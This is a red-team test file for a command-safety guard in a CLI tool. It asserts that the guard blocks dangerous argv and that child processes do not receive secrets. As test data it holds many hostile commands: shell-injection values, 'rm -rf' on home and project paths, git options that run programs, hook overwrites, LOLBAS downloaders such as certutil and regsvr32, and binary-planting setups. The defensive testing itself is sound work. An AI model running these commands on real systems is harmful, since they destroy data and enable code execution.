/**
 * One witness per finding. Each asserts the SAFE behaviour, so each is RED while the defect exists.
 * Run: node --test --import tsx tests/redteam/guard/witnesses.test.ts
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { Command } from 'commander';
import { assessCommandSafety } from '../../../src/safety/command-guard.ts';
import { registerSafety } from '../../../src/cli/commands/safety.ts';
import { CliExit } from '../../../src/cli/human.ts';
import { EXIT, type CliIO } from '../../../src/cli/io.ts';
import { findExecutable, runTool } from '../../../src/integrations/exec.ts';
import { runEvidencePayload, uploadSpec } from '../../../src/cli/commands/sandbox/index.ts';

const isWin = process.platform === 'win32';
let tmp = '';
let root = '';

before(() => {
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cws-guard-wit-')));
  root = path.join(tmp, 'project');
  for (const d of ['.git/hooks', '.cws', 'src']) fs.mkdirSync(path.join(root, d), { recursive: true });
  fs.writeFileSync(path.join(root, '.cws', 'events.jsonl'), '{}\n');
});
after(() => fs.rmSync(tmp, { recursive: true, force: true }));

const check = (argv: string[], runsWithoutShell: boolean) =>
  assessCommandSafety(argv, { cwd: root, projectRoot: root, runsWithoutShell });

/** argv lists the guard wrongly allows. */
function allowed(list: string[][], runsWithoutShell = true): string[] {
  return list.filter((argv) => check(argv, runsWithoutShell).ok).map((argv) => argv.join(' '));
}

describe('S witnesses: command guard', () => {
  it('S-1: --check (retyped into a shell) blocks & newline backtick $( ^ not only ; | < >', () => {
    const bad = allowed([
      ['git', 'log', '--format=x & calc'],
      ['git', 'log', '--format=x\nrm -rf src'],
      ['echo', '`rm -rf src`'],
      ['echo', '$(rm -rf src)'],
      ['echo', 'x ^& calc'],
    ], false);
    assert.deepEqual(bad, []);
  });

  it('S-2: --check blocks ~ $HOME %USERPROFILE% delete targets that a shell expands to the home dir', () => {
    const bad = allowed([
      ['rm', '-rf', '~'], ['rm', '-rf', '$HOME'], ['rm', '-rf', '%USERPROFILE%'], ['rm', '-rf', '~/work'],
    ], false);
    assert.deepEqual(bad, []);
  });

  it('S-3: git subcommands/options that execute programs are blocked', () => {
    const bad = allowed([
      ['git', 'submodule', 'foreach', 'calc'],
      ['git', 'bisect', 'run', 'calc'],
      ['git', 'rebase', '-x', 'calc', 'HEAD~1'],
      ['git', 'rebase', '--exec=calc', 'HEAD~1'],
      ['git', 'fetch', '--upload-pack=calc', 'origin'],
      ['git', 'ls-remote', '--upload-pack=calc', 'x'],
      ['git', 'clone', 'ext::calc', 'x'],
      ['git', 'grep', '-O', 'calc', 'x'],
      ['git', 'diff', '--ext-diff'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-4: git forms that discard work or history are blocked (gc --prune=now, reflog expire, rm -rf ., checkout <rev> <path>, branch -f)', () => {
    const bad = allowed([
      ['git', 'gc', '--prune=now'],
      ['git', 'reflog', 'expire', '--expire=now', '--all'],
      ['git', 'rm', '-rf', '.'],
      ['git', 'checkout', 'HEAD', 'src'],
      ['git', 'worktree', 'remove', '-f', 'x'],
      ['git', 'update-ref', '-d', 'refs/heads/main'],
      ['git', 'filter-branch', '--tree-filter', 'x'],
      ['git', 'branch', '-f', 'main', 'HEAD~5'],
      ['git', 'branch', '-M', 'x'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-5: git can write outside the project or retarget another repo (-C, --work-tree, --output, -o)', () => {
    const bad = allowed([
      ['git', '-C', '../../outside', 'rm', '-rf', '.'],
      ['git', '--work-tree=/', 'rm', '-rf', '.'],
      ['git', 'log', '--output=../../outside/x'],
      ['git', 'format-patch', '-o', '../../outside', 'HEAD~1'],
      ['git', 'archive', '-o', '../../outside/x.tar', 'HEAD'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-6: overwriting/truncating .cws or .git is blocked for non-rm writers (truncate, cp, dd, sed -i, tee, ln -sf, rsync)', () => {
    const bad = allowed([
      ['truncate', '-s', '0', '.cws/events.jsonl'],
      ['cp', '/dev/null', '.cws/events.jsonl'],
      ['cp', 'evil.sh', '.git/hooks/pre-commit'],
      ['dd', 'if=/dev/zero', 'of=.cws/events.jsonl'],
      ['sed', '-i', 's/a/b/', '.cws/events.jsonl'],
      ['tee', '.git/hooks/pre-commit'],
      ['ln', '-sf', '/etc/passwd', '.cws/events.jsonl'],
      ['rsync', '-a', '--delete', 'empty/', '.cws/'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-7: writers cannot write outside the project root (cp, dd, curl -o, wget -O, tar, shred)', () => {
    const bad = allowed([
      ['cp', 'src/a', '../../outside/b'],
      ['dd', 'if=src/a', 'of=../../outside/b'],
      ['curl', '-o', '../../outside/b', 'http://example.invalid'],
      ['wget', '-O', '../../outside/b', 'http://example.invalid'],
      ['tar', '--remove-files', '-cf', '../../outside/a.tar', 'src'],
      ['shred', '-u', '../../outside/x'],
      ['unlink', '../../outside/x'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-8: interpreters/launchers outside the denylist run arbitrary code (tsx, ts-node, node22, java, dotnet, ssh, awk, fd -x, rg --pre)', () => {
    const bad = allowed([
      ['tsx', 'x.ts'], ['ts-node', 'x.ts'], ['node22', '-e', '1'], ['java', '-jar', 'x.jar'], ['dotnet', 'x.dll'],
      ['ssh', 'host', 'rm -rf /'], ['awk', 'BEGIN{system("calc")}'], ['fd', '-x', 'rm'], ['rg', '--pre', 'calc', 'x'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-9: Windows LOLBAS executors/downloaders are blocked (certutil -urlcache, bitsadmin, regsvr32 scrobj, forfiles, wmic, msbuild)', () => {
    const bad = allowed([
      ['certutil', '-urlcache', '-f', 'http://example.invalid/a', 'a.exe'],
      ['bitsadmin', '/transfer', 'j', 'http://example.invalid/a', 'C:\\a.exe'],
      ['regsvr32', '/s', '/u', '/i:http://example.invalid/a.sct', 'scrobj.dll'],
      ['forfiles', '/c', 'cmd /c del @file'],
      ['wmic', 'process', 'call', 'create', 'calc'],
      ['msbuild', 'x.xml'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-10: package-runner equivalents are blocked (npm init/create <pkg>, pnpm/yarn create, npm explore, corepack, bun x)', () => {
    const bad = allowed([
      ['npm', 'init', 'left-pad'], ['npm', 'create', 'vite'], ['pnpm', 'create', 'vite'], ['yarn', 'create', 'vite'],
      ['npm', 'explore', 'left-pad', '--', 'calc'], ['corepack', 'pnpm', 'dlx', 'cowsay'], ['bun', 'x', 'cowsay'],
    ]);
    assert.deepEqual(bad, []);
  });

  it('S-11: runner rule triggers on the subcommand only, not on any argument (false positive)', () => {
    const blocked = [['npm', 'ls', 'exec'], ['npm', 'view', 'x', 'version'], ['pnpm', 'add', 'dlx']]
      .filter((argv) => !check(argv, true).ok).map((argv) => argv.join(' '));
    assert.deepEqual(blocked, []);
  });
});

describe('S witnesses: exec.ts / safe-run runtime', () => {
  it('S-12: runTool does not hand API keys to children (I16)', async () => {
    const saved = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'canary-gemini-key-123';
    try {
      const r = await runTool(process.execPath, ['-e', 'process.stdout.write(process.env.GEMINI_API_KEY ?? "absent")']);
      assert.equal(r.stdout, 'absent');
    } finally {
      if (saved === undefined) delete process.env.GEMINI_API_KEY; else process.env.GEMINI_API_KEY = saved;
    }
  });

  it('S-13: safe-run resolves argv[0] the way the guard saw it, not from the project directory (Windows cwd lookup)', { skip: !isWin }, async () => {
    // A project file named like an innocuous command is really cmd.exe: guard sees `ls`, spawn runs the planted file.
    const dir = path.join(tmp, 'planted');
    fs.mkdirSync(dir, { recursive: true });
    fs.copyFileSync(path.join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'cmd.exe'), path.join(dir, 'ls.exe'));
    const errors: string[] = [];
    const io: CliIO = {
      cwd: dir, stdout: () => {}, stderr: (t) => errors.push(t), isInteractive: false,
      ask: async () => '', readStdin: async () => '', challenge: () => '', copy: async () => false,
    };
    const program = new Command();
    registerSafety(program, { io });
    let code = -1;
    try {
      await program.parseAsync(['safe-run', '--', 'ls', '/c', 'exit', '77'], { from: 'user' });
      code = 0;
    } catch (e) {
      code = e instanceof CliExit ? e.code : -2;
    }
    assert.notEqual(code, 77, 'a binary planted in the project directory was executed');
  });

  it('S-14: runTool timeout kill does not resolve `taskkill` from the current directory (Windows)', { skip: !isWin }, async () => {
    const dir = path.join(tmp, 'planted-tk');
    fs.mkdirSync(dir, { recursive: true });
    // hostname.exe ignores /pid /T /F, so if it replaces taskkill the child survives the timeout
    fs.copyFileSync(path.join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'hostname.exe'), path.join(dir, 'taskkill.exe'));
    const before = process.cwd();
    process.chdir(dir);
    try {
      const started = Date.now();
      const r = await runTool(process.execPath, ['-e', 'setTimeout(()=>{},4000)'], { timeoutMs: 300 });
      assert.equal(r.timedOut, true);
      assert.ok(Date.now() - started < 2500, `child outlived its timeout by ${Date.now() - started}ms because a planted taskkill.exe ran`);
    } finally {
      process.chdir(before);
    }
  });

  it('S-15: Windows bare-name spawn of `clip` (cli/main.ts) must not pick up ./clip.exe', { skip: !isWin }, () => {
    // same call shape as copy() in src/cli/main.ts: spawn('clip', [], { stdio: [pipe, ignore, ignore] }) with cwd = process.cwd()
    const dir = path.join(tmp, 'planted-clip');
    fs.mkdirSync(dir, { recursive: true });
    fs.copyFileSync(path.join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'hostname.exe'), path.join(dir, 'clip.exe'));
    const r = spawnSync('clip', [], { cwd: dir, input: 'x', encoding: 'utf8', windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
    assert.doesNotMatch(r.stdout ?? '', new RegExp(os.hostname(), 'i'), 'planted clip.exe ran instead of System32\\clip.exe');
  });

  it('S-16: a child exit code of 2 or 3 is not passed through as NEEDS_HUMAN / INTEGRITY', async () => {
    const repo = path.join(tmp, 'repo');
    fs.mkdirSync(repo, { recursive: true });
    spawnSync('git', ['init', '-q'], { cwd: repo });
    const io: CliIO = {
      cwd: repo, stdout: () => {}, stderr: () => {}, isInteractive: false,
      ask: async () => '', readStdin: async () => '', challenge: () => '', copy: async () => false,
    };
    const program = new Command();
    registerSafety(program, { io });
    let code = 0;
    try {
      // `git ls-remote --exit-code` exits 2 when no ref matches
      await program.parseAsync(['safe-run', '--', 'git', 'ls-remote', '--exit-code', '.', 'refs/heads/none'], { from: 'user' });
    } catch (e) {
      code = e instanceof CliExit ? e.code : -2;
    }
    assert.ok(code !== EXIT.NEEDS_HUMAN && code !== EXIT.INTEGRITY, `child exit 2 surfaced as cws exit ${code} (= NEEDS_HUMAN)`);
  });

  it('S-17: safe-run offers a way to bound runtime (--timeout) and drops secrets from the child env', () => {
    const src = fs.readFileSync(path.resolve('src/cli/commands/safety.ts'), 'utf8');
    assert.match(src, /timeout/i, 'runProcess spawns with stdio inherit, no timeout, full env');
  });

  it('S-18: runTool honours very large timeouts instead of killing at 1 ms (setTimeout overflow)', async () => {
    const r = await runTool(process.execPath, ['-e', 'setTimeout(()=>{},300)'], { timeoutMs: 2 ** 31 });
    assert.equal(r.timedOut, false);
    assert.equal(r.ok, true);
  });

  it('S-19: findExecutable finds a program named with its extension on Windows (node.exe)', { skip: !isWin }, () => {
    assert.notEqual(findExecutable('node.exe'), null);
  });
});

describe('S witnesses: sandbox', () => {
  it('S-20: the sandbox upload is not the whole project root (.git, .cws, .env would be uploaded)', () => {
    assert.notEqual(uploadSpec(), '.:/sandbox');
  });

  it('S-21: sandbox run evidence text does not store secrets from the command line (I9)', () => {
    const token = `ghp_${'A1b2C3d4E5'.repeat(4).slice(0, 36)}`;
    const payload = runEvidencePayload('c1', ['curl', '-H', `Authorization: Bearer ${token}`, 'https://example.invalid'], {
      command: 'x', args: [], ok: true, code: 0, signal: null, timedOut: false, truncated: false, durationMs: 1, stdout: '', stderr: '',
    }, 'p');
    assert.ok(!payload.text.includes(token), 'raw token stored in the evidence event');
  });

  it('S-22: sandbox run reports the sandboxed command exit code without colliding with cws exit codes', () => {
    const dir = path.resolve('src/cli/commands/sandbox');
    const src = fs.readdirSync(dir).map((f) => fs.readFileSync(path.join(dir, f), 'utf8')).join('');
    assert.doesNotMatch(src, /throw new CliExit\(result\.code \?\? EXIT\.ERROR\)/, 'remote exit code 2/3 become NEEDS_HUMAN/INTEGRITY');
  });
});
